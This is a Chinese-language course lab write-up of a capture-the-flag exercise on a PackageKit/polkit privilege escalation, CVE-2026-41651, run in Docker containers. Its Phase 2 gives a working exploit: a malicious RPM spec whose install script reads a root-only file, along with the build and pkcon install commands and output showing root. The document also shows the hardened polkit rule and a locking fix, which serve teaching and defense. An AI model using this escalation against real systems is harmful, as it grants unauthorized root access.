---
title: Week 12 — Pack2TheRoot CTF 實戰記錄
tags: CEH, CTF, CVE-2026-41651, TOCTOU
description: 2026-ADV-CEH Week 12 互動式 CTF 奪旗完整流程與截圖指南
---

# Week 12 — Pack2TheRoot CTF 實戰記錄

> **CVE**：[CVE-2026-41651](https://nvd.nist.gov/vuln/detail/CVE-2026-41651) | **CVSS 8.8** | **PackageKit TOCTOU Local Privilege Escalation**

---

## 環境架構

```
┌─────────────────────────────────────────────────┐
│              Kali Linux (主機)                   │
│                                                  │
│  ┌──────────┐   ┌──────────┐   ┌────────────┐  │
│  │ Vulnerable│   │ Patched  │   │  Exploit   │  │
│  │ port 2222 │   │ port 2223 │   │  (C exploit)│  │
│  └────┬─────┘   └────┬─────┘   └──────┬─────┘  │
│       │              │                │         │
│  SSH: labuser/labuser                  │         │
└─────────────────────────────────────────────────┘
```

---

## 事前準備

```bash
# 啟動 Docker 環境
cd ~/pack2theroot-lab
docker compose up -d

# 確認容器狀態
docker compose ps

# 進入 lab 目錄
cd ~/test-cve-2026/weeks/week-12
```

---

## Phase 1 🟢 — 系統偵察

### 步驟

```bash
# SSH 進入 vulnerable 容器
ssh labuser@localhost -p 2222
# 密碼: labuser

# 檢查 polkit action 授權設定
pkaction --verbose --action-id org.freedesktop.packagekit.package-install-untrusted

# 查看自訂 polkit 規則
cat /etc/polkit-1/rules.d/10-pack2theroot-lab-misconfig.rules
```

### 發現

| 項目 | 值 |
|------|-----|
| Action ID | `org.freedesktop.packagekit.package-install-untrusted` |
| 問題設定 | `allow_active = yes` |
| 正確值 | `allow_active = auth_admin` |
| 風險 | 任何本地使用者可不經認證安裝套件 |

### 📸 截圖 1

`pkaction --verbose` 輸出，紅框標示 `allow_active = yes`

---

## Phase 2 🟡 — TOCTOU 攻擊

### 步驟

```bash
# 同一個 SSH session (vulnerable container, port 2222)

# 1. 建立惡意 RPM 規格檔
cat > /tmp/evil.spec << 'SPECEOF'
Name: lab-evil-pkg
Version: 1.0
Release: 1
Summary: CTF
License: MIT
BuildArch: noarch
%description
CVE-2026-41651
%prep
echo x > README
%build
%install
mkdir -p %{buildroot}
%post
cat /root/flag.txt > /tmp/flag_captured.txt
chmod 644 /tmp/flag_captured.txt
id >> /tmp/flag_captured.txt
%files
%doc README
SPECEOF

# 2. 打包
mkdir -p ~/rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS}
rpmbuild -bb /tmp/evil.spec

# 3. 透過 PackageKit 安裝（觸發漏洞）
pkcon install-local --allow-untrusted ~/rpmbuild/RPMS/noarch/lab-evil-pkg-1.0-1.noarch.rpm

# 4. 讀取 flag（確認 root 執行）
cat /tmp/flag_captured.txt
```

### 結果

```
PACK2THEROOT{pkcon_install_untrusted_without_auth_is_rce_as_root}
uid=0(root) gid=0(root) groups=0(root)
```

### 📸 截圖 2

`cat /tmp/flag_captured.txt` 輸出，需同時顯示 flag 字串及 `uid=0(root)`

---

## Phase 3 🔴 — 防禦實作

### 執行位置：Kali 本機

```bash
cd ~/test-cve-2026/weeks/week-12

# 觀察脆弱版本（預期 ~990 次負數）
python3 transaction_demo.py --vulnerable

# 測試安全版本
python3 transaction_demo.py --safe
```

### `safe_execute()` 實作

```python
def safe_execute(self, amount: int) -> bool:
    with self.lock:                          # mutex 保護
        if self.state != self.AUTHORIZED:    # check
            return False
        time.sleep(0.001)                    # 模擬 GLib event loop 延遲
        if self.state != self.AUTHORIZED:    # re-check（sleep 後重新驗證）
            return False
        self.balance -= amount               # use
        self.state = self.COMPLETE
        self.execution_count += 1
        return True
```

### 結果

| 版本 | balance 負數 | 雙重執行 |
|------|-------------|---------|
| unsafe | **993** 次 | **993** 次 |
| safe | **0** 次 | **0** 次 |

### 📸 截圖 3

`python3 transaction_demo.py --safe` 輸出，標示 `0 次` 及 `FLAG{...}`

---

## Patched Container 對比

### 執行位置

```bash
ssh labuser@localhost -p 2223
# 密碼: labuser

cat /etc/polkit-1/rules.d/10-pack2theroot-lab-hardened.rules
```

### 差異

| 項目 | Vulnerable (2222) | Patched (2223) |
|------|------------------|----------------|
| polkit 規則 | `polkit.Result.YES` | `polkit.Result.AUTH_ADMIN_KEEP` |
| 認證要求 | 不需要 | 需要管理員密碼 |
| 攻擊結果 | ✅ 成功取得 root | ❌ polkit 拒絕 |

### 📸 截圖 4

硬化的 polkit 規則檔內容

---

## IOC 檢查

```bash
# 在 vulnerable 容器內執行
journalctl -u packagekit --no-pager | grep "assertion failed"
```

> 本次 polkit bypass 路徑不會觸發 assertion failed（該 IOC 僅在 D-Bus TOCTOU 攻擊路徑出現）

---

## 互動式奪旗（選擇性）

```bash
cd ~/test-cve-2026/weeks/week-12
python3 w12-interactive-lab.py
```

透過互動問答獲得 W12 格式的動態 flag。

---

## 滲透測試報告

範本檔案：`W12_滲透測試報告_範例.md`

1. 複製到 Word
2. 插入 4 張截圖
3. 填寫學號、姓名
4. 存成 `W12_滲透測試報告_學號_姓名.docx`

---

## 參考資料

- [CVE-2026-41651 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-41651)
- [Pack2TheRoot — Telekom Security Advisory](https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html)
- [dinosn/pack2theroot-lab](https://github.com/dinosn/pack2theroot-lab)
- [PwnKit CVE-2021-4034](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
